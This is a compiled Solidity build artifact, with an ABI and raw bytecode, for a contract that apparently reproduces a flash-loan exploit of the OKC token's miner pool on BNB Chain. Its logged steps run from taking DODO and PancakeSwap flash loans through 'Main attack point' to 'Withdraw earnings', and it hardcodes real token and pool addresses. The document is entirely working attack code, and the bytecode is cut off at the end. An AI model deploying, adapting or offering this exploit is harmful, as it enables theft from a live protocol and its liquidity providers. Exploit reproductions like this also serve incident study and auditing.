{"abi":[{"type":"function","name":"DPP1","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IDPPOracle"}],"stateMutability":"view"},{"type":"function","name":"DPP2","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IDPPOracle"}],"stateMutability":"view"},{"type":"function","name":"DPP3","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IDPPOracle"}],"stateMutability":"view"},{"type":"function","name":"DPP4","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IDPPOracle"}],"stateMutability":"view"},{"type":"function","name":"DPP5","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IDPPOracle"}],"stateMutability":"view"},{"type":"function","name":"DPPFlashLoanCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"baseAmount","type":"uint256","internalType":"uint256"},{"name":"quoteAmount","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"OKC","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC20"}],"stateMutability":"view"},{"type":"function","name":"USDT","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC20"}],"stateMutability":"view"},{"type":"function","name":"attack_contract1","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract AttackContract2"}],"stateMutability":"view"},{"type":"function","name":"attack_contract2","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract AttackContract2"}],"stateMutability":"view"},{"type":"function","name":"calculateAddress","inputs":[{"name":"creator","type":"address","internalType":"address"},{"name":"nonce","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"expect1","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getTokenPrice","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"minerPool","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address payable"}],"stateMutability":"view"},{"type":"function","name":"nonce","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"pancakeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"pancakePair_USDT_OKC","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IPancakePair"}],"stateMutability":"view"},{"type":"function","name":"pancakeRouter","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IPancakeRouter"}],"stateMutability":"view"},{"type":"function","name":"pancakeV3FlashCallback","inputs":[{"name":"fee0","type":"uint256","internalType":"uint256"},{"name":"fee1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"pancakeV3Pool","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IPancakeV3Pool"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405260015f55600380546001600160a01b03199081167355d398326f99059ff775485246999027b31979551790915560048054821673abba891c633fb27f8aa656ea6244dedb15153fe01790556005805482167336016c4f0e0177861e6377f73c380c70138e13ee1790556006805482167381917eb96b397dfb1c6000d28a5bc08c0f05fc1d17905560078054821673feafe253802b77456b4627f8c2306a9cebb5d6811790556008805482167326d0c625e5f5d6de034495fbde1f6e9377185618179055600980548216736098a5638d8d7e9ed2f952d35b2b67c34ec6b476179055600a80548216739ad32e3054268b849b84a8dbcc7c8f7c52e4e69a179055600b80548216734f3126d5de26413abdcf6948943fb9d0847d9818179055600c805482167310ed43c718714eb63d5aa57b78b54704e256024e179055600d8054909116739cc7283d8f8b92654e6097aca2acb9655fd5ed96179055348015610169575f5ffd5b50613e32806101775f395ff3fe60806040526004361061011b575f3560e01c80638872a6991161009d578063c5440a3e11610062578063c5440a3e146102f0578063c54e44eb1461030f578063da7c6f281461032e578063df8d573f1461034d578063eda0b70a1461036c575f5ffd5b80638872a699146102605780639e302b8a1461027f578063a1d483361461029e578063affed0e0146102bd578063c21ebd07146102d1575f5ffd5b80636eaad3c6116100e35780636eaad3c6146101c55780637ed1f1dd146101e4578063807e72d7146102035780638480081214610222578063874a3cb714610241575f5ffd5b80630d294ec91461011f57806337a8bb501461015b5780634b94f50e1461017a57806369508cc61461019c5780636b5b937f146101bb575b5f5ffd5b34801561012a575f5ffd5b5060095461013e906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b348015610166575f5ffd5b5060045461013e906001600160a01b031681565b348015610185575f5ffd5b5061018e61038b565b604051908152602001610152565b3480156101a7575f5ffd5b50600b5461013e906001600160a01b031681565b6101c36104af565b005b3480156101d0575f5ffd5b5060055461013e906001600160a01b031681565b3480156101ef575f5ffd5b506101c36101fe3660046131ce565b610ad1565b34801561020e575f5ffd5b5061013e61021d366004613231565b6112db565b34801561022d575f5ffd5b506101c361023c3660046131ce565b611500565b34801561024c575f5ffd5b5060065461013e906001600160a01b031681565b34801561026b575f5ffd5b5060085461013e906001600160a01b031681565b34801561028a575f5ffd5b5060015461013e906001600160a01b031681565b3480156102a9575f5ffd5b506101c36102b8366004613259565b6116dd565b3480156102c8575f5ffd5b5061018e5f5481565b3480156102dc575f5ffd5b50600c5461013e906001600160a01b031681565b3480156102fb575f5ffd5b5060025461013e906001600160a01b031681565b34801561031a575f5ffd5b5060035461013e906001600160a01b031681565b348015610339575f5ffd5b50600a5461013e906001600160a01b031681565b348015610358575f5ffd5b50600d5461013e906001600160a01b031681565b348015610377575f5ffd5b5060075461013e906001600160a01b031681565b6040805160028082526060820183525f9283929190602083019080368337505060045482519293506001600160a01b0316918391505f906103ce576103ce6132bc565b6001600160a01b0392831660209182029290920101526003548251911690829060019081106103ff576103ff6132bc565b6001600160a01b039283166020918202929092010152600c5460405163d06ca61f60e01b81525f92919091169063d06ca61f9061044a90670de0b6b3a7640000908690600401613313565b5f60405180830381865afa158015610464573d5f5f3e3d5ffd5b505050506040513d5f823e601f3d908101601f1916820160405261048b9190810190613333565b9050806001815181106104a0576104a06132bc565b60200260200101519250505090565b60408051808201909152601681527503a3930b739b332b92fb0b6361039b4bd329034b99d160551b602082015230803b916104ea9083611853565b6104f261189c565b604080518082018252600f81526e036b4b732b92837b7b61027a5a19d1608d1b60208201526004805460055493516370a0823160e01b81526001600160a01b039485169281019290925261062e9316906370a08231906024015b602060405180830381865afa158015610567573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061058b91906133fb565b6040805180820182526002815261016160f51b60208201526004805460055493516370a0823160e01b81526001600160a01b03948516928101929092529192670de0b6b3a76400009216906370a08231906024015b602060405180830381865afa1580156105fb573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061061f91906133fb565b6106299190613426565b61198c565b604080518082018252600981526802628102aa9a22a1d160bd1b6020820152600354600d5492516370a0823160e01b81526001600160a01b03938416600482015261071793909116906370a08231906024015b602060405180830381865afa15801561069c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106c091906133fb565b6040805180820182526002815261016160f51b6020820152600354600d5492516370a0823160e01b81526001600160a01b0393841660048201529192670de0b6b3a7640000929116906370a08231906024016105e0565b6040805180820182526008815267026281027a5a19d160c51b602082015260048054600d5493516370a0823160e01b81526001600160a01b03948516928101929092526108029316906370a08231906024015b602060405180830381865afa158015610785573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107a991906133fb565b6040805180820182526002815261016160f51b602082015260048054600d5493516370a0823160e01b81526001600160a01b03948516928101929092529192670de0b6b3a76400009216906370a08231906024016105e0565b6003546006546040516370a0823160e01b81526001600160a01b0391821660048201525f9291909116906370a0823190602401602060405180830381865afa158015610850573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061087491906133fb565b600654604051633429253960e21b81525f6004820152602481018390523060448201526080606482015260016084820152600360fc1b60a48201529192506001600160a01b03169063d0a494e49060c4015f604051808303815f87803b1580156108dc575f5ffd5b505af11580156108ee573d5f5f3e3d5ffd5b50506003546040516370a0823160e01b81523060048201525f93506001600160a01b0390911691506370a0823190602401602060405180830381865afa15801561093a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061095e91906133fb565b90506109bf6040518060400160405280601481526020017303ab9b23a1030b6b7bab73a10383937b334ba1d160651b81525082604051806040016040528060018152602001600160fd1b815250670de0b6b3a7640000856106299190613426565b604080518082018252600f81526e036b4b732b92837b7b61027a5a19d1608d1b60208201526004805460055493516370a0823160e01b81526001600160a01b0394851692810192909252610a1d9316906370a082319060240161054c565b604080518082018252600981526802628102aa9a22a1d160bd1b6020820152600354600d5492516370a0823160e01b81526001600160a01b039384166004820152610a7493909116906370a0823190602401610681565b6040805180820182526008815267026281027a5a19d160c51b602082015260048054600d5493516370a0823160e01b81526001600160a01b0394851692810192909252610acb9316906370a082319060240161076a565b50505050565b60408051808201825260018152600360fc1b602090910152517f044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d90610b199084908490613445565b604051809103902003610c94576003546007546040516370a0823160e01b81526001600160a01b0391821660048201525f9291909116906370a0823190602401602060405180830381865afa158015610b74573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610b9891906133fb565b600754604051633429253960e21b81525f6004820152602481018390523060448201526080606482015260016084820152603160f81b60a48201529192506001600160a01b03169063d0a494e49060c4015f604051808303815f87803b158015610c00575f5ffd5b505af1158015610c12573d5f5f3e3d5ffd5b505060035460065460405163a9059cbb60e01b81526001600160a01b03928316945063a9059cbb9350610c4d92909116908890600401613454565b6020604051808303815f875af1158015610c69573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c8d919061346d565b50506112d4565b60408051808201825260018152603160f81b602090910152517fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc690610cdc9084908490613445565b604051809103902003610e10576003546008546040516370a0823160e01b81526001600160a01b0391821660048201525f9291909116906370a0823190602401602060405180830381865afa158015610d37573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610d5b91906133fb565b600854604051633429253960e21b81525f6004820152602481018390523060448201526080606482015260016084820152601960f91b60a48201529192506001600160a01b03169063d0a494e49060c4015f604051808303815f87803b158015610dc3575f5ffd5b505af1158015610dd5573d5f5f3e3d5ffd5b505060035460075460405163a9059cbb60e01b81526001600160a01b03928316945063a9059cbb9350610c4d92909116908890600401613454565b60408051808201825260018152601960f91b602090910152517fad7c5bef027816a800da1736444fb58a807ef4c9603b7848673f7e3a68eb14a590610e589084908490613445565b604051809103902003610f8c576003546009546040516370a0823160e01b81526001600160a01b0391821660048201525f9291909116906370a0823190602401602060405180830381865afa158015610eb3573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610ed791906133fb565b600954604051633429253960e21b81525f6004820152602481018390523060448201526080606482015260016084820152603360f81b60a48201529192506001600160a01b03169063d0a494e49060c4015f604051808303815f87803b158015610f3f575f5ffd5b505af1158015610f51573d5f5f3e3d5ffd5b505060035460085460405163a9059cbb60e01b81526001600160a01b03928316945063a9059cbb9350610c4d92909116908890600401613454565b60408051808201825260018152603360f81b602090910152517f2a80e1ef1d7842f27f2e6be0972bb708b9a135c38860dbe73c27c3486c34f4de90610fd49084908490613445565b60405180910390200361110857600354600a546040516370a0823160e01b81526001600160a01b0391821660048201525f9291909116906370a0823190602401602060405180830381865afa15801561102f573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061105391906133fb565b600a54604051633429253960e21b81525f6004820152602481018390523060448201526080606482015260016084820152600d60fa1b60a48201529192506001600160a01b03169063d0a494e49060c4015f604051808303815f87803b1580156110bb575f5ffd5b505af11580156110cd573d5f5f3e3d5ffd5b505060035460095460405163a9059cbb60e01b81526001600160a01b03928316945063a9059cbb9350610c4d92909116908890600401613454565b60408051808201825260018152600d60fa1b602090910152517f13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060906111509084908490613445565b6040518091039020036112d457600354600a546040516370a0823160e01b81526001600160a01b0391821660048201525f9291909116906370a0823190602401602060405180830381865afa1580156111ab573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906111cf91906133fb565b600b54604080516a0211654585005212800000602080830182905283518084039091018152828401938490526312439b2f60e21b9093529394506001600160a01b039092169263490e6cbc9261122d923092915f91906044016134c1565b5f604051808303815f87803b158015611244575f5ffd5b505af1158015611256573d5f5f3e3d5ffd5b5050600354600a5460405163a9059cbb60e01b81526001600160a01b03928316945063a9059cbb935061129192909116908890600401613454565b6020604051808303815f875af11580156112ad573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112d1919061346d565b50505b5050505050565b5f6060825f0361133457604051606b60f91b6020820152602560fa1b60218201526001600160601b0319606086901b166022820152600160ff1b60368201526037015b60405160208183030381529060405290506114ef565b607f831161138357604051606b60f91b6020820152602560fa1b60218201526001600160601b0319606086901b16602282015260f884901b6001600160f81b031916603682015260370161131e565b60ff83116113dc5760405160d760f81b6020820152602560fa1b60218201526001600160601b0319606086901b166022820152608160f81b603682015260f884901b6001600160f81b031916603782015260380161131e565b61ffff831161143657604051601b60fb1b6020820152602560fa1b60218201526001600160601b0319606086901b166022820152604160f91b60368201526001600160f01b031960f085901b16603782015260390161131e565b62ffffff83116114915760405160d960f81b6020820152602560fa1b60218201526001600160601b0319606086901b166022820152608360f81b60368201526001600160e81b031960e885901b166037820152603a0161131e565b604051606d60f91b6020820152602560fa1b60218201526001600160601b0319606086901b166022820152602160fa1b60368201526001600160e01b031960e085901b166037820152603b0160405160208183030381529060405290505b805160209091012090505b92915050565b5f61150d828401846134f7565b600354600d5460405163a9059cbb60e01b81529293506001600160a01b039182169263a9059cbb926115459216908590600401613454565b6020604051808303815f875af1158015611561573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611585919061346d565b506115e76040518060400160405280601581526020017402aa9a22a103a3930b739b332b9103a379026281d1605d1b8152508260405180604001604052806002815260200161016160f51b815250670de0b6b3a7640000856106299190613426565b604080518082018252600981526802628102aa9a22a1d160bd1b6020820152600354600d5492516370a0823160e01b81526001600160a01b03938416600482015261167e93909116906370a08231906024015b602060405180830381865afa158015611655573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061167991906133fb565b611853565b6040805180820182526008815267026281027a5a19d160c51b602082015260048054600d5493516370a0823160e01b81526001600160a01b03948516928101929092526116d59316906370a082319060240161163a565b505050505050565b5f6116ea828401846134f7565b6003546040516370a0823160e01b81523060048201529192505f916001600160a01b03909116906370a0823190602401602060405180830381865afa158015611735573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061175991906133fb565b90506117b46040518060400160405280600d81526020016c03ab9b23a1030b6b7bab73a1d1609d1b8152508260405180604001604052806002815260200161016160f51b815250670de0b6b3a7640000856106299190613426565b611803604051806040016040528060088152602001670189037b5b1901e960c51b8152506117e061038b565b60405180604001604052806005815260200164081d5cd91d60da1b8152506119d5565b61180b611a21565b611813612039565b600354600b546001600160a01b039182169163a9059cbb9116611836898661350e565b6040518363ffffffff1660e01b8152600401611291929190613454565b6118988282604051602401611869929190613521565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b179052613067565b5050565b60048054600c5460405163095ea7b360e01b81526001600160a01b039283169363095ea7b3936118d19316915f199101613454565b6020604051808303815f875af11580156118ed573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611911919061346d565b50600d54600c5460405163095ea7b360e01b81526001600160a01b039283169263095ea7b392611949929116905f1990600401613454565b6020604051808303815f875af1158015611965573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611989919061346d565b50565b610acb848484846040516024016119a69493929190613542565b60408051601f198184030181529190526020810180516001600160e01b031663c67ea9d160e01b179052613067565b611a1c8383836040516024016119ed9392919061357e565b60408051601f198184030181529190526020810180516001600160e01b0316635970e08960e01b179052613067565b505050565b611a42604051806060016040528060308152602001613dcd60309139613070565b6040805160028082526060820183525f92602083019080368337505060035482519293506001600160a01b0316918391505f90611a8157611a816132bc565b6001600160a01b039283166020918202929092010152600454825191169082906001908110611ab257611ab26132bc565b6001600160a01b039283166020918202929092010152600354600d546040516370a0823160e01b815290831660048201525f9291909116906370a0823190602401602060405180830381865afa158015611b0e573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611b3291906133fb565b60048054600d546040516370a0823160e01b81526001600160a01b03918216938101939093529293505f9216906370a0823190602401602060405180830381865afa158015611b83573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611ba791906133fb565b9050611c046040518060400160405280601a81526020017f4c502073776170206265666f7265207265736572766573203d200000000000008152508360405180604001604052806002815260200161016160f51b8152508461198c565b600c5460405163d06ca61f60e01b81525f916001600160a01b03169063d06ca61f90611c4090691b87506a3e7b0d400000908890600401613313565b5f60405180830381865afa158015611c5a573d5f5f3e3d5ffd5b505050506040513d5f823e601f3d908101601f19168201604052611c819190810190613333565b600d5460408051691b87506a3e7b0d40000060208201529293506001600160a01b039091169163022c0d9f916001916905f3bffd636fa1fc3a1d913091016040516020818303038152906040526040518563ffffffff1660e01b8152600401611ced94939291906135a8565b5f604051808303815f87803b158015611d04575f5ffd5b505af1158015611d16573d5f5f3e3d5ffd5b5050600354600d546040516370a0823160e01b81526001600160a01b0391821660048201525f9450911691506370a0823190602401602060405180830381865afa158015611d66573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611d8a91906133fb565b60048054600d546040516370a0823160e01b81526001600160a01b03918216938101939093529293505f9216906370a0823190602401602060405180830381865afa158015611ddb573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611dff91906133fb565b9050611e5c6040518060400160405280601981526020017f4c502073776170206166746572207265736572766573203d20000000000000008152508360405180604001604052806002815260200161016160f51b8152508461198c565b6003546040516370a0823160e01b81523060048201525f916001600160a01b0316906370a0823190602401602060405180830381865afa158015611ea2573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611ec691906133fb565b600480546040516370a0823160e01b815230928101929092529192505f916001600160a01b0316906370a0823190602401602060405180830381865afa158015611f12573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611f3691906133fb565b9050611fa16040518060400160405280601781526020017f7573647420616d6f756e74287377617020656e64293a200000000000000000008152508360405180604001604052806002815260200161016160f51b815250670de0b6b3a7640000866106299190613426565b61200360405180604001604052806016815260200175037b5b19030b6b7bab73a1439bbb0b81032b732149d160551b8152508260405180604001604052806002815260200161016160f51b815250670de0b6b3a7640000856106299190613426565b61202f604051806040016040528060088152602001670189037b5b1901e960c51b8152506117e061038b565b5050505050505050565b6120776040518060400160405280601d81526020017f2d2d2d205374657020323a205374616b696e67204c6971756964697479000000815250613070565b5f612083305f546112db565b90506120a76040518060600160405280603c8152602001613d55603c9139826130b3565b6004805460405163a9059cbb60e01b81526001600160a01b039091169163a9059cbb916120df918591662386f26fc100009101613454565b6020604051808303815f875af11580156120fb573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061211f919061346d565b5060405161212c90613161565b604051809103905ff080158015612145573d5f5f3e3d5ffd5b50600180546001600160a01b0319166001600160a01b03929092169190911790555f80549080612174836135d4565b909155505060408051808201909152601681527503a3930b739b332b92fb0b6361039b4bd329034b99d160551b6020820152813b906121b39082611853565b5f6121bf305f546112db565b90506121e36040518060600160405280603c8152602001613d91603c9139826130b3565b60035460405163a9059cbb60e01b81526001600160a01b039091169063a9059cbb9061221b908490655af3107a400090600401613454565b6020604051808303815f875af1158015612237573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061225b919061346d565b506004805460405163a9059cbb60e01b81526001600160a01b039091169163a9059cbb9161228e91859160019101613454565b6020604051808303815f875af11580156122aa573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906122ce919061346d565b506040516122db90613161565b604051809103905ff0801580156122f4573d5f5f3e3d5ffd5b50600280546001600160a01b0319166001600160a01b03928316179055600d5460408051630240bc6b60e21b815290515f9384938493911691630902f1ac916004808201926060929091908290030181865afa158015612356573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061237a9190613602565b9250925092506123c96040518060400160405280600d81526020016c033b2ba2932b9b2b93b32b99d1609d1b815250846001600160701b0316846001600160701b03168463ffffffff166130f8565b600480546040516370a0823160e01b815230928101929092525f916001600160a01b03909116906370a0823190602401602060405180830381865afa158015612414573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061243891906133fb565b600c54604051632b58577b60e21b8152600481018390526001600160701b038087166024830152871660448201529192505f916001600160a01b039091169063ad615dec90606401602060405180830381865afa15801561249b573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906124bf91906133fb565b600354600d5460405163a9059cbb60e01b81529293506001600160a01b039182169263a9059cbb926124f79216908590600401613454565b6020604051808303815f875af1158015612513573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612537919061346d565b50600480546040516370a0823160e01b815230928101929092525f916001600160a01b03909116906370a0823190602401602060405180830381865afa158015612583573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906125a791906133fb565b60048054600d5460405163a9059cbb60e01b81529394506001600160a01b039182169363a9059cbb936125e09390921691869101613454565b6020604051808303815f875af11580156125fc573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612620919061346d565b50600d546040516335313c2160e11b81523060048201525f916001600160a01b031690636a627842906024016020604051808303815f875af1158015612668573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061268c91906133fb565b90506126ba604051806040016040528060088152602001670189037b5b1901e960c51b8152506117e061038b565b6040805180820182526016815275030ba3a30b1b5afb1b7b73a3930b1ba18903638101e960551b6020820152600d5460015492516370a0823160e01b81526001600160a01b03938416600482015261271e93909116906370a082319060240161163a565b6040805180820182526016815275030ba3a30b1b5afb1b7b73a3930b1ba19103638101e960551b6020820152600d5460025492516370a0823160e01b81526001600160a01b03938416600482015261278293909116906370a082319060240161163a565b600d546040516370a0823160e01b81523060048201525f916001600160a01b0316906370a0823190602401602060405180830381865afa1580156127c8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906127ec91906133fb565b90506128196040518060400160405280600981526020016803a3434b99026281d160bd1b81525082611853565b600d5460025460405163a9059cbb60e01b81526001600160a01b039283169263a9059cbb9261284f929116908590600401613454565b6020604051808303815f875af115801561286b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061288f919061346d565b506128ce6040518060400160405280601d81526020017f2d2d2d205374657020333a204d61696e2061747461636b20706f696e74000000815250613070565b60055460408051600481526024810182526020810180516001600160e01b031663b8af22db60e01b17905290516001600160a01b0390921691612911919061364e565b5f604051808303815f865af19150503d805f811461294a576040519150601f19603f3d011682016040523d82523d5f602084013e61294f565b606091505b50505061297e604051806040016040528060088152602001670189037b5b1901e960c51b8152506117e061038b565b600254600d5460405163371c046560e21b81526001600160a01b0391821660048201523060248201525f92919091169063dc701194906044016020604051808303815f875af11580156129d3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906129f791906133fb565b600d546040516370a0823160e01b81523060048201529192505f916001600160a01b03909116906370a0823190602401602060405180830381865afa158015612a42573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612a6691906133fb565b600c546004546003549293505f9283926001600160a01b039081169263baa2abde92908216911686858030612a9d426103e861350e565b60405160e089901b6001600160e01b03191681526001600160a01b039788166004820152958716602487015260448601949094526064850192909252608484015290921660a482015260c481019190915260e40160408051808303815f875af1158015612b0c573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612b309190613664565b91509150612b60604051806040016040528060088152602001670189037b5b1901e960c51b8152506117e061038b565b6001546004805460405163371c046560e21b81526001600160a01b03918216928101929092523060248301525f92169063dc701194906044016020604051808303815f875af1158015612bb5573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612bd991906133fb565b6002546004805460405163371c046560e21b81526001600160a01b03918216928101929092523060248301529293505f929091169063dc701194906044016020604051808303815f875af1158015612c33573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612c5791906133fb565b9050612c976040518060400160405280601d81526020017f2d2d2d205374657020343a205769746864726177206561726e696e6773000000815250613070565b600480546040516370a0823160e01b815230928101929092525f916001600160a01b03909116906370a0823190602401602060405180830381865afa158015612ce2573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612d0691906133fb565b6040805160028082526060820183529293505f929091602083019080368337505060045482519293506001600160a01b0316918391505f90612d4a57612d4a6132bc565b6001600160a01b039283166020918202929092010152600354825191169082906001908110612d7b57612d7b6132bc565b6001600160a01b03928316602091820292909201810191909152604080518082018252600d81526c037b5b19030b6b7bab73a101e9609d1b928101929092526004805491516370a0823160e01b81523091810191909152612e799391909116906370a0823190602401602060405180830381865afa158015612dff573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612e2391906133fb565b6040805180820182526002815261016160f51b60208201526004805492516370a0823160e01b815230918101919091529091670de0b6b3a7640000916001600160a01b03909116906370a08231906024016105e0565b612ea5604051806040016040528060088152602001670189037b5b1901e960c51b8152506117e061038b565b612ed66040518060400160405280601081526020016f1cddd85c0813d2d0c81d1bc81554d11560821b815250613070565b600c546001600160a01b0316635c11d795835f8430612ef7426103e861350e565b6040518663ffffffff1660e01b8152600401612f17959493929190613686565b5f604051808303815f87803b158015612f2e575f5ffd5b505af1158015612f40573d5f5f3e3d5ffd5b50505050612f70604051806040016040528060088152602001670189037b5b1901e960c51b8152506117e061038b565b604080518082018252600e81526d03ab9b23a1030b6b7bab73a101e960951b602082015260035491516370a0823160e01b8152306004820152613052926001600160a01b0316906370a0823190602401602060405180830381865afa158015612fdb573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190612fff91906133fb565b6040805180820182526002815261016160f51b602082015260035491516370a0823160e01b81523060048201529091670de0b6b3a7640000916001600160a01b03909116906370a08231906024016105e0565b50505050505050505050505050505050505050565b61198981613141565b6119898160405160240161308491906136c1565b60408051601f198184030181529190526020810180516001600160e01b031663104c13eb60e21b179052613067565b61189882826040516024016130c99291906136d3565b60408051601f198184030181529190526020810180516001600160e01b031663319af33360e01b179052613067565b610acb8484848460405160240161311294939291906136fc565b60408051601f198184030181529190526020810180516001600160e01b031663a7a8785360e01b179052613067565b80516a636f6e736f6c652e6c6f67602083015f808483855afa5050505050565b61062a8061372b83390190565b80356001600160a01b0381168114613184575f5ffd5b919050565b5f5f83601f840112613199575f5ffd5b50813567ffffffffffffffff8111156131b0575f5ffd5b6020830191508360208285010111156131c7575f5ffd5b9250929050565b5f5f5f5f5f608086880312156131e2575f5ffd5b6131eb8661316e565b94506020860135935060408601359250606086013567ffffffffffffffff811115613214575f5ffd5b61322088828901613189565b969995985093965092949392505050565b5f5f60408385031215613242575f5ffd5b61324b8361316e565b946020939093013593505050565b5f5f5f5f6060858703121561326c575f5ffd5b8435935060208501359250604085013567ffffffffffffffff811115613290575f5ffd5b61329c87828801613189565b95989497509550505050565b634e487b7160e01b5f52604160045260245ffd5b634e487b7160e01b5f52603260045260245ffd5b5f8151808452602084019350602083015f5b828110156133095781516001600160a01b03168652602095860195909101906001016132e2565b5093949350505050565b828152604060208201525f61332b60408301846132d0565b949350505050565b5f60208284031215613343575f5ffd5b815167ffffffffffffffff811115613359575f5ffd5b8201601f81018413613369575f5ffd5b805167ffffffffffffffff811115613383576133836132a8565b8060051b604051601f19603f830116810181811067ffffffffffffffff821117156133b0576133b06132a8565b6040529182526020818401810192908101878411156133cd575f5ffd5b6020850194505b838510156133f0578451808252602095860195909350016133d4565b509695505050505050565b5f6020828403121561340b575f5ffd5b5051919050565b634e487b7160e01b5f52601160045260245ffd5b5f8261344057634e487b7160e01b5f52601260045260245ffd5b500490565b818382375f9101908152919050565b6001600160a01b03929092168252602082015260400190565b5f6020828403121561347d575f5ffd5b8151801515811461348c575f5ffd5b9392505050565b5f81518084528060208401602086015e5f602082860101526020601f19601f83011685010191505092915050565b60018060a01b0385168152836020820152826040820152608060608201525f6134ed6080830184613493565b9695505050505050565b5f60208284031215613507575f5ffd5b5035919050565b808201808211156114fa576114fa613412565b604081525f6135336040830185613493565b90508260208301529392505050565b608081525f6135546080830187613493565b856020840152828103604084015261356c8186613493565b91505082606083015295945050505050565b606081525f6135906060830186613493565b84602084015282810360408401526134ed8185613493565b84815283602082015260018060a01b0383166040820152608060608201525f6134ed6080830184613493565b5f600182016135e5576135e5613412565b5060010190565b80516001600160701b0381168114613184575f5ffd5b5f5f5f60608486031215613614575f5ffd5b61361d846135ec565b925061362b602085016135ec565b9150604084015163ffffffff81168114613643575f5ffd5b809150509250925092565b5f82518060208501845e5f920191825250919050565b5f5f60408385031215613675575f5ffd5b505080516020909101519092909150565b85815284602082015260a060408201525f6136a460a08301866132d0565b6001600160a01b0394909416606083015250608001529392505050565b602081525f61348c6020830184613493565b604081525f6136e56040830185613493565b905060018060a01b03831660208301529392505050565b608081525f61370e6080830187613493565b602083019590955250604081019290925260609091015291905056fe60806040525f80546001600160a01b03199081167355d398326f99059ff775485246999027b31979551790915560018054821673abba891c633fb27f8aa656ea6244dedb15153fe017905560028054909116739cc7283d8f8b92654e6097aca2acb9655fd5ed96179055348015610074575f5ffd5b505f80546040516370a0823160e01b81523060048201526001600160a01b03909116906370a0823190602401602060405180830381865afa1580156100bb573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100df9190610241565b5f5460025460405163a9059cbb60e01b81